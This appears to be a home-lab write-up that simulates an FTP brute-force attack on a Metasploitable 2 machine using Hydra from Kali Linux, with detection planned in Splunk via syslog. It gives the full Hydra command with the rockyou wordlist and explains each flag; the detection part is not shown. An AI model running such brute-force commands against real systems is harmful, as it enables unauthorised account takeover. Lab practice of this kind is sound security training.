# 🔓 FTP Brute Force Attack using Hydra

## 🎯 Objective
Simulate a brute-force attack on the Metasploitable 2 FTP service using **Hydra** from Kali Linux and detect it in **Splunk** via syslog.

---

## 🛠️ Tools & Setup

| Tool           | Role                              |
|----------------|-----------------------------------|
| Hydra (Kali)   | Performs brute-force on FTP login |
| Metasploitable | Exposes FTP (vsftpd)              |
| Splunk (Windows)| Collects syslog and shows alerts  |

- **Target IP (Metasploitable)**: `192.168.56.105`
- **Attacker IP (Kali)**: `192.168.56.103`
- **Splunk IP**: `192.168.56.104`
- Rsyslog is configured on Metasploitable to forward logs to Splunk

---

## ⚔️ Attack Command (Hydra)

```bash
hydra -l msfadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.56.105 -V -f


💡 Explanation:
-l msfadmin: Login username

-P rockyou.txt: Password list

ftp://: Target protocol and IP

-V: Verbose (show each attempt)

-f: Stop after the first valid password is found


